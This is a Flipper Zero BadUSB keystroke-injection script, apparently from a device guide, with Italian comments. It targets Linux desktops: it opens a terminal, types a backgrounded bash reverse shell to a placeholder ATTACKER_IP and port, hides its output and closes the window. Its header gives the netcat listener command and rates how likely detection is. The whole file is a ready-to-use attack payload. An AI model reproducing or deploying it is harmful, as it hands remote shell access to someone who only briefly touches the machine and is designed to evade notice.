REM ============================================================
REM Title:    Linux Reverse Shell
REM Target:   Linux (Ubuntu/Debian/Fedora/Kali)
REM Author:   FlipperZero-guide
REM Category: Reverse Shell
REM Privs:    User (no root)
REM Layout:   US
REM Time:     ~6 secondi
REM Detect:   Medio - dipende da auditd/syslog config
REM Desc:     Apre un terminale e lancia reverse shell bash.
REM           Listener: nc -lvnp ATTACKER_PORT
REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
REM ============================================================

DELAY 2000
REM Apri terminale (Ctrl+Alt+T su Ubuntu/Debian)
CTRL ALT t
DELAY 1500

STRING nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &>/dev/null &
ENTER
DELAY 500
STRING exit
ENTER
